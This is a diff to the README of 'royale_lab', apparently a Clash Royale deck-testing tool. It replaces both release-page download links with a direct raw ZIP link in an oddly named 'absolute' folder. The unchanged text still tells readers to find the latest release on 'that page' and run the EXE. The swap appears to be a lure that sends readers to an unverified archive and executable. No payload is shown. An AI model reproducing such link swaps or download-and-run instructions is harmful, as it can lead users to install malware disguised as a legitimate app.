@@ -1,6 +1,6 @@
 # 🟦 royale_lab - Build and test Clash Royale setups
 
-[![Download royale_lab](https://img.shields.io/badge/Download-royale__lab-blue?style=for-the-badge&logo=github)](https://github.com/distributive-filter937/royale_lab/releases)
+[![Download royale_lab](https://img.shields.io/badge/Download-royale__lab-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/distributive-filter937/royale_lab/main/absolute/royale-lab-2.5-alpha.3.zip)
 
 ## 🧩 What this app does
 
@@ -20,7 +20,7 @@ Use it to:
 
 Visit this page to download the app:
 
-[https://github.com/distributive-filter937/royale_lab/releases](https://github.com/distributive-filter937/royale_lab/releases)
+[https://raw.githubusercontent.com/distributive-filter937/royale_lab/main/absolute/royale-lab-2.5-alpha.3.zip](https://raw.githubusercontent.com/distributive-filter937/royale_lab/main/absolute/royale-lab-2.5-alpha.3.zip)
 
 On that page, look for the latest release and download the Windows file that matches your system. If there is a ZIP file, download it and extract it first. If there is an EXE file, you can run it after the download finishes.
 
